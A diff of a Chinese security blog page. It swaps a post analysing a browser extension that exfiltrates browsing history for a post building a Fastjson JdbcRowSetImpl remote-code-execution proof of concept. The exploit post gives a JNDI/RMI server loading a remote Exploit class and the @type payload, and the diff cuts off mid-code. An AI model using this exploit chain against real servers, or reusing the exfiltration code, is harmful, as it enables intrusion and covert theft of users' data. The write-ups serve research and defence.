@@ -76,7 +76,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="浏览器,crxMouse Gesture,手势插件,隐私," />
+  <meta name="keywords" content="RCE,反序列化,PoC,Fastjson,JdbcRowSetImpl," />
 
 
 
@@ -94,21 +94,20 @@
 
 
 
-<meta name="description" content="浏览器插件已经成为了浏览器的必备品，但是市场上的插件也良莠不齐，甚至部分插件切换用户隐私，如浏览器的历史记录。笔者就遇到了这样一个插件，就是著名的手势插件：crxMouse Chrome Gestures，更可气的是已经用了这个插件一年多了。 #1 简单介绍：用Google搜索crxMouse Chrome Gestures导向到google市场，可以看到这款插件的简单介绍。原名:Gestures">
-<meta name="keywords" content="浏览器,crxMouse Gesture,手势插件,隐私">
+<meta name="description" content="发表于2017年11月22日，修改于2018年10月23日 背景这篇文章主要是基于我在看雪2017开发者峰会的演讲而来，由于时间和听众对象的关系，在大会上主要精力都集中在反序列化的防御上。前面的Fastjson PoC的构造分析涉及得很少，另外我在5月份分享的Fastjson Poc构造与分析限制条件太多，所以写下这篇文章。 Fastjson 使用Fastjson是Alibaba开发的，Java语">
+<meta name="keywords" content="RCE,反序列化,PoC,Fastjson,JdbcRowSetImpl">
 <meta property="og:type" content="article">
-<meta property="og:title" content="小心浏览器插件窃取你的隐私">
-<meta property="og:url" content="http://xxlegend.com/2016/05/01/小心浏览器插件窃取你的隐私/index.html">
+<meta property="og:title" content="基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析">
+<meta property="og:url" content="http://xxlegend.com/2018/10/23/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/index.html">
 <meta property="og:site_name" content="xxlegend">
-<meta property="og:description" content="浏览器插件已经成为了浏览器的必备品，但是市场上的插件也良莠不齐，甚至部分插件切换用户隐私，如浏览器的历史记录。笔者就遇到了这样一个插件，就是著名的手势插件：crxMouse Chrome Gestures，更可气的是已经用了这个插件一年多了。 #1 简单介绍：用Google搜索crxMouse Chrome Gestures导向到google市场，可以看到这款插件的简单介绍。原名:Gestures">
-<meta property="og:image" content="http://104.251.228.50/pic/crxmouse_google.png">
-<meta property="og:image" content="http://104.251.228.50/pic/related.png">
-<meta property="og:image" content="http://104.251.228.50/pic/crxmouse.png">
-<meta property="og:updated_time" content="2017-05-02T01:51:56.000Z">
+<meta property="og:description" content="发表于2017年11月22日，修改于2018年10月23日 背景这篇文章主要是基于我在看雪2017开发者峰会的演讲而来，由于时间和听众对象的关系，在大会上主要精力都集中在反序列化的防御上。前面的Fastjson PoC的构造分析涉及得很少，另外我在5月份分享的Fastjson Poc构造与分析限制条件太多，所以写下这篇文章。 Fastjson 使用Fastjson是Alibaba开发的，Java语">
+<meta property="og:image" content="http://xxlegend.com/images/JdbcRowSetImpl_1.png">
+<meta property="og:image" content="http://xxlegend.com/images/JdbcRowSetImpl_2.png">
+<meta property="og:updated_time" content="2018-10-23T07:12:17.252Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="小心浏览器插件窃取你的隐私">
-<meta name="twitter:description" content="浏览器插件已经成为了浏览器的必备品，但是市场上的插件也良莠不齐，甚至部分插件切换用户隐私，如浏览器的历史记录。笔者就遇到了这样一个插件，就是著名的手势插件：crxMouse Chrome Gestures，更可气的是已经用了这个插件一年多了。 #1 简单介绍：用Google搜索crxMouse Chrome Gestures导向到google市场，可以看到这款插件的简单介绍。原名:Gestures">
-<meta name="twitter:image" content="http://104.251.228.50/pic/crxmouse_google.png">
+<meta name="twitter:title" content="基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析">
+<meta name="twitter:description" content="发表于2017年11月22日，修改于2018年10月23日 背景这篇文章主要是基于我在看雪2017开发者峰会的演讲而来，由于时间和听众对象的关系，在大会上主要精力都集中在反序列化的防御上。前面的Fastjson PoC的构造分析涉及得很少，另外我在5月份分享的Fastjson Poc构造与分析限制条件太多，所以写下这篇文章。 Fastjson 使用Fastjson是Alibaba开发的，Java语">
+<meta name="twitter:image" content="http://xxlegend.com/images/JdbcRowSetImpl_1.png">
 
 
 
@@ -136,13 +135,13 @@
 
 
 
-  <link rel="canonical" href="http://xxlegend.com/2016/05/01/小心浏览器插件窃取你的隐私/"/>
+  <link rel="canonical" href="http://xxlegend.com/2018/10/23/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/"/>
 
 
 
 
 
-  <title>小心浏览器插件窃取你的隐私 | xxlegend</title>
+  <title>基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析 | xxlegend</title>
 
 
 </head>
@@ -338,7 +337,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2016/05/01/小心浏览器插件窃取你的隐私/">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/10/23/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="廖新喜">
@@ -359,7 +358,7 @@
             
             
               
-                小心浏览器插件窃取你的隐私
+                基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析
               
             
           </h1>
@@ -374,8 +373,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-01T15:38:36+08:00">
-                2016-05-01
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-23T15:12:17+08:00">
+                2018-10-23
               </time>
             
 
@@ -397,8 +396,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Burpsuite/" itemprop="url" rel="index">
-                    <span itemprop="name">Burpsuite</span>
+                  <a href="/categories/Java/" itemprop="url" rel="index">
+                    <span itemprop="name">Java</span>
                   </a>
                 </span>
 
@@ -415,9 +414,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2016/05/01/小心浏览器插件窃取你的隐私/#comments" itemprop="discussionUrl">
+                <a href="/2018/10/23/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2016/05/01/小心浏览器插件窃取你的隐私/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2018/10/23/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -425,7 +424,7 @@
 
           
           
-             <span id="/2016/05/01/小心浏览器插件窃取你的隐私/" class="leancloud_visitors" data-flag-title="小心浏览器插件窃取你的隐私">
+             <span id="/2018/10/23/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/" class="leancloud_visitors" data-flag-title="基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -453,17 +452,26 @@
       
 
       
-        <p>浏览器插件已经成为了浏览器的必备品，但是市场上的插件也良莠不齐，甚至部分插件切换用户隐私，如浏览器的历史记录。笔者就遇到了这样一个插件，就是著名的手势插件：crxMouse Chrome Gestures，更可气的是已经用了这个插件一年多了。</p>
-<p>#1 简单介绍：<br>用Google搜索crxMouse Chrome Gestures导向到google市场，可以看到这款插件的简单介绍。<br>原名:Gestures for Chrome(TM)汉化版.方便,快捷,充分发掘鼠标的所有操作.功能包括:鼠标手势,超级拖曳,滚轮手势,摇杆手势,平滑滚动,标签页列表等.<br>本扩展致力于通过鼠标来实现一些功能操作,充分挖掘鼠标的所有操作.<br>功能包括:鼠标手势,超级拖曳,滚轮手势,摇杆手势,平滑滚动,标签页列表等<br>目前在google市场上这款插件有30万的用户，累计评价5000，其中很大一部分是国内用户，影响还是非常广泛的。<img src="http://104.251.228.50/pic/crxmouse_google.png" alt="google市场"></p>
-<p>#2 验证窃取行为<br>通过wireshark抓包可以看到两个分别发送到s808.searchelper.com和s1808.searchelper.com的请求，直接上图：<img src="http://104.251.228.50/pic/related.png" alt="s808服务请求"></p>
-<p>  从origin可以看出，请求是来源于浏览器插件，标记为：jgiplclhploodgnkcljjgddajfbmafmp，可以通过chrome的chrome://extensions/找到该id对应的插件，就是<img src="http://104.251.228.50/pic/crxmouse.png" alt="插件显示">，其对应的系统目录为<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\Users\[用户]\AppData\Local\Google\Chrome\User Data\Default\Extensions\jgiplclhploodgnkcljjgddajfbmafmp</div><div class="line">  ```，我们可以通过分析其代码发现其实现，这个后续再讲。细心的读者可能会看到post请求段被加密了，看结构像是base64，尝试用base64解码，还是base64编码格式，再次解码，得到如下数据：</div></pre></td></tr></table></figure></p>
-<p>s=808&amp;md=21&amp;pid=SjOa3PgqWSHYapU&amp;sess=314039255259558500&amp;q=<a href="http://bbs.pediy.com/showthread.php?t=179524&amp;prev=http://bbs.pediy.com/forumdisplay.php?f=161&amp;link=1&amp;sub=chrome&amp;hreferer=http://bbs.pediy.com/forumdisplay.php?f=161&amp;tmv=3015" target="_blank" rel="external">http://bbs.pediy.com/showthread.php?t=179524&amp;prev=http://bbs.pediy.com/forumdisplay.php?f=161&amp;link=1&amp;sub=chrome&amp;hreferer=http://bbs.pediy.com/forumdisplay.php?f=161&amp;tmv=3015</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">s=808就代表着服务器s808,pid即userid，sess是用户本地标记session，sub代表着浏览器类型，q代表当前页面，prev代表着从哪个页面过来，也就是referer的作用，hreferer就也记录着referer字段有了这些数据就可以分析用户行为，可以供搜索引擎，其实百度统计和google统计也是干同样的事，甚至百度统计还有点击等的统计。就这样你的浏览行为被发送给了其他服务器，这不是最危险的，最危险的是你在浏览内网的一些页面也会被发送出去，内网的一些站点就很容易被泄露了。</div><div class="line">  接着我们看另外一个请求，这个请求是发送到s1808服务器上，具体请求如下：![s1808服务器的请求][4]，解密加密后的内容和发送到s808的请求基本一致，具体如下：</div></pre></td></tr></table></figure></p>
-<p>s=1808&amp;md=21&amp;pid=SjOa3PgqWSHYapU&amp;sess=765877789119258500&amp;sub=chrome&amp;q=http%3A//bbs.pediy.com/showthread.php%3Ft%3D179524&amp;hreferer=http%3A//bbs.pediy.com/forumdisplay.php%3Ff%3D161&amp;prev=http%3A//bbs.pediy.com/forumdisplay.php%3Ff%3D161&amp;tmv=4015&amp;tmf=1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">这里就有点搞不太清楚发这样一个备份请求的原因了，难道仅仅是备份，有待思考，为了更好的弄清楚该插件还有没有其他危险行为，接下来我们分析插件的实现。</div><div class="line"></div><div class="line">#3 恶意插件实现</div><div class="line">插件的恶意行为集中在upalytics_ch.js代码中，安装后的初始化代码：</div><div class="line">```js</div><div class="line">this.initOnceAfterInstall = function() &#123;</div><div class="line">    if (!utils.db.get(&quot;userid&quot;)) &#123;</div><div class="line">        var id = utils.createUserID();</div><div class="line">        utils.db.set(&quot;userid&quot;, id)</div><div class="line">    &#125;</div><div class="line">    if (!utils.db.get(&quot;install_time&quot;)) &#123;</div><div class="line">        var now = (new Date).getTime() / 1E3;</div><div class="line">        utils.db.set(&quot;install_time&quot;, now)</div><div class="line">    &#125;</div><div class="line">    if (!utils.db_type.get(&quot;tmv&quot;)) &#123;</div><div class="line">        var now = (new Date).getTime() / 1E3;</div><div class="line">        utils.db_type.set(&quot;tmv&quot;, SIM_ModuleConstants._TMV);</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
-<p>在初始化中生成userid，获取install_time，twv字段存放在本地localstorage中，接着会创建各种调用addListener接口来创建监听器，当tab页更新，替换，激活的时候就会调用相应的请求发送相应的函数，extension_onRequest则是发送到s808服务器，tabs_onUpdated,tabs_onActivated,tabs_onReplaced则是发送请求到s1808服务器，具体代码如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.start = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        chrome.extension.onRequest.addListener(extension_onRequest);</div><div class="line">        chrome.tabs.onUpdated.addListener(tabs_onUpdated);</div><div class="line">        chrome.tabs.onActivated.addListener(tabs_onActivated);</div><div class="line">        chrome.tabs.onReplaced.addListener(tabs_onReplaced)</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">        log.SEVERE(<span class="string">"8835"</span>, e)</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>下面我们简单分析下发送到s808.searchelper.com的related请求的代码，已简化，简化部分主要是去除一些google搜索的跳转，去除docType非html类型的，去除间隔时间很短的。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">extension_onRequest</span>(<span class="params">request, sender, sendResponse</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> prev_state = tabs_states[tabId];</div><div class="line">    tabs_states[tabId] = change_status;</div><div class="line">    <span class="keyword">if</span> (res_prev_url == tab_url &amp;&amp; prev_state != change_status)&#123;</div><div class="line">	    log.ERROR(<span class="string">"ERROR 8002 ??"</span>);</div><div class="line">	    <span class="keyword">return</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(res_prev_url == <span class="literal">null</span> || res_prev_url.length == <span class="number">0</span>) &#123;</div><div class="line">	    res_prev_url = last_prev;</div><div class="line">    &#125;</div><div class="line">    last_prev = tab_url;</div><div class="line">    <span class="keyword">var</span> data = <span class="string">"s="</span> + SIM_Config_BG.getSourceId() + <span class="string">"&amp;md=21&amp;pid="</span> + utils.db.get(<span class="string">"userid"</span>) + <span class="string">"&amp;sess="</span> + SIM_Session.getSessionId() + <span class="string">"&amp;q="</span> + <span class="built_in">encodeURIComponent</span>(tab_url) + <span class="string">"&amp;prev="</span> + <span class="built_in">encodeURIComponent</span>(res_prev_url) + <span class="string">"&amp;link="</span> + (ref ? <span class="string">"1"</span> : <span class="string">"0"</span>) + <span class="string">"&amp;sub="</span> + SIM_ModuleConstants.BROWSER + <span class="string">"&amp;hreferer="</span> + <span class="built_in">encodeURIComponent</span>(ref);</div><div class="line">    data = data + <span class="string">"&amp;tmv="</span> + SIM_ModuleConstants._TMV;</div><div class="line">    data = SIM_Base64.encode(SIM_Base64.encode(data));</div><div class="line">    data = <span class="string">"e="</span> + data;</div><div class="line">    <span class="keyword">var</span> url = utils.db_type.get(<span class="string">"server"</span>) + <span class="string">"/related"</span>;</div><div class="line"></div><div class="line">    utils.net.post(url, <span class="string">"json"</span>, data, <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</div><div class="line">			log.INFO(<span class="string">"Succeeded in posting data"</span>);</div><div class="line">			tabs_prevs[tabId] = tab_url</div><div class="line">			&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">httpCode</span>) </span>&#123;</div><div class="line">			log.INFO(<span class="string">"Failed to retrieve content. (HTTP Code:"</span> + httpCode.status + <span class="string">")"</span>);</div><div class="line">			log.ERROR(<span class="string">"ERROR 8004 ??"</span>);</div><div class="line">			tabs_prevs[tabId] = tab_url</div><div class="line">			&#125;)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>从上述代码中可以看出在关键的浏览器当前url和referer都进行了两次base64编码处理，可以逃过一些普通用户的眼睛，难道这种方式能够躲过google的一些自动审查，比较好奇。</p>
-<p>#4 建议<br>码农也不容易，辛辛苦苦写出来的程序不赚钱只能靠窃取用户浏览历史发给第三方来获取回报，想必也是迫不得已，当然对于这种窃取隐私的绝对要抵制。mouse guesture作为一个很好用的特性，笔者已经难以离开，所以在google市场上选择了其他的guesture插件。有了这个教训，相信大家以后使用浏览器插件肯定会多长一双眼睛。</p>
+        <p>发表于2017年11月22日，修改于2018年10月23日</p>
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>这篇文章主要是基于我在看雪2017开发者峰会的演讲而来，由于时间和听众对象的关系，在大会上主要精力都集中在反序列化的防御上。前面的Fastjson PoC的构造分析涉及得很少，另外我在5月份分享的Fastjson Poc构造与分析限制条件太多，所以写下这篇文章。</p>
+<h2 id="Fastjson-使用"><a href="#Fastjson-使用" class="headerlink" title="Fastjson 使用"></a>Fastjson 使用</h2><p>Fastjson是Alibaba开发的，Java语言编写的高性能JSON库。采用“假定有序快速匹配”的算法，号称Java语言中最快的JSON库。Fastjson接口简单易用，广泛使用在缓存序列化、协议交互、Web输出、Android客户端<br>提供两个主要接口toJsonString和parseObject来分别实现序列化和反序列化。项目地址：<code>https://github.com/alibaba/fastjson</code>。那我们看下如何使用？首先定义一个User.java,代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> Long   id;</div><div class="line">    <span class="keyword">private</span> String name;</div><div class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getId</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> id;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Long id)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.id = id;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> name;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.name = name;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>序列化的代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</div><div class="line">User guestUser = <span class="keyword">new</span> User();</div><div class="line">guestUser.setId(<span class="number">2L</span>);</div><div class="line">guestUser.setName(<span class="string">"guest"</span>);</div><div class="line">String jsonString = JSON.toJSONString(guestUser);</div><div class="line">System.out.println(jsonString);</div></pre></td></tr></table></figure></p>
+<p>反序列化的代码示例：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">String jsonString = <span class="string">"&#123;\"name\":\"guest\",\"id\":12&#125;"</span>;</div><div class="line">User user = JSON.parseObject(jsonString, User.class);</div></pre></td></tr></table></figure></p>
+<p>上述代码的parseObject也可以直接用parse接口。</p>
+<h2 id="Fastjson安全特性"><a href="#Fastjson安全特性" class="headerlink" title="Fastjson安全特性"></a>Fastjson安全特性</h2><p>反序列化的Gadget需要无参默认构造方法或者注解指定构造方法并添加相应参数。使用Feature.SupportNonPublicField才能打开非公有属性的反序列化处理，@type可以指定反序列化任意类，调用其set，get，is方法。<br><img src="/images/JdbcRowSetImpl_1.png" alt="1"><br>上图则是Fastjson反序列框架图。JSON门面类，提供一些静态方法，如parse，parseObject.其主要功能都是在DefaultJSONParser类中实现。DefaultJSONParser引用了ParserConfig，主要保存一些相关配置信息。也引用了JSONLexerBase，这个类用来处理字符分析。而反序列化用到的JavaBeanDeserializer则是JavaBean反序列化处理主类。fastjson在1.2.24版本添加enable_autotype开关，将一些类加到黑名单中，后续我也给它报过bypass，fastjson也一并修复。</p>
+<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDI即Java Naming and Directory Interface，翻译成中文就Java命令和目录接口，2016年的blackhat大会上web议题重点讲到，但是对于json这一块没有涉及。JNDI提供了很多实现方式，主要有RMI，LDAP，CORBA等。我们可以看一下它的架构图<br><img src="/images/JdbcRowSetImpl_2.png" alt="2">，JNDI提供了一个统一的外部接口，底层SPI则是多样的。在使用JNDIReferences的时候可以远程加载外部的对象，即实现factory的初始化。如果说其lookup方法的参数是我们可以控制的，可以将其参数指向我们控制的RMI服务，切换到我们控制的RMI/LDAP服务等等。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</div><div class="line"><span class="comment">//http://xxlegend.com/Exploit.class</span></div><div class="line">Reference reference = <span class="keyword">new</span> javax.naming.Reference(“Exploit<span class="string">",“Exploit"</span>,<span class="string">"http://xxlegend.com/"</span>);</div><div class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</div><div class="line">registry.bind(“Exploit<span class="string">", referenceWrapper);</span></div></pre></td></tr></table></figure></p>
+<p>这段代码主要讲到了在1099端口上创建一个RMI服务，RMI的内容则是通过外部的http服务地址获取。在客户端则是将lookup的地址指向刚才我们创建的RMI服务，即能达到远程代码执行的目的。可以使用如下的请求端代码进行测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Hashtable env = new Hashtable();</div><div class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</div><div class="line">env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);</div><div class="line">Context ctx = new InitialContext(env);</div><div class="line">Object local_obj = RicterCctx.lookup(&quot;rmi://xxlegend.com/Exploit&quot;);</div></pre></td></tr></table></figure></p>
+<p>那么攻击者的流程就是这样的。攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。</p>
+<h1 id="PoC构造与分析"><a href="#PoC构造与分析" class="headerlink" title="PoC构造与分析"></a>PoC构造与分析</h1><p>介绍的背景有点多，正式切入我们的正题，基于JdbcRowSetImpl的PoC是如何构造和执行的。在今年5月份的时候，我也公布了Fastjson基于TemplateImpl的PoC的，但是限制还比较多，需要打开SupportNonPublic开关，这个场景是比较少见的，详细的分析见我的博客<code>http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</code>，后续ricterz也作了一篇分析：<code>https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Up</code>。<br>在看雪峰会上我提到了好几种PoC，下面我简单的给这些PoC做个分类：<br>1，基于TemplateImpl<br>2，基于JNDI Bean Property类型<br>3，基于JNDI Field类型</p>
+<p>今天主讲基于JNDI Bean Property这个类型，这个类型和JNDI Field类型的区别就在于Bean Property需要借助setter，getter方法触发，而Field类型则没有这个必要。JdbcRowSetImpl刚好就在Bean Property分类之下，其他的PoC后续再讲。这个Poc相对于TemplateImpl却没有一点儿限制，当然java在JDK 6u132, 7u122, or 8u113补了是另外一码事。 PoC具体如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:389/obj"</span>,<span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</div></pre></td></tr></table></figure></p>
+<p>由于这个PoC是基于JNDI，下面我们简单构造一下，首先是服务端的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span></span></div><div class="line">            AlreadyBoundException, RemoteException, NamingException &#123;</div><div class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</div><div class="line">        <span class="comment">//http://xxlegend.com/Exploit.class即可</span></div><div class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Exloit"</span>,</div><div class="line">                <span class="string">"Exploit"</span>,<span class="string">"http://xxlegend.com/"</span>);</div><div class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</div><div class="line">        registry.bind(<span class="string">"Exploit"</span>,referenceWrapper);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</div><div class="line">        start();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>rmi服务端需要一个Exploit.class放到rmi指向的web服务器目录下，这个Exploit.class是一个factory，通过Exploit.java编译得来，在JNDI执行的过程会被初始化。如下是Exploit.java的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</div><div class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</div><div class="line">        Exploit e = <span class="keyword">new</span> Exploit();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>服务端构造好之后，下面来看java应用执行的代码，示例如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</div><div class="line">        testJdbcRowSetImpl();</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testJdbcRowSetImpl</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">//        String payload = "&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\"," +</span></div><div class="line"><span class="comment">//                " \"autoCommit\":true&#125;";</span></div><div class="line">        String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\","</span> +</div><div class="line">                <span class="string">" \"autoCommit\":true&#125;"</span>;</div><div class="line">        JSON.parse(payload);</div><div class="line"> 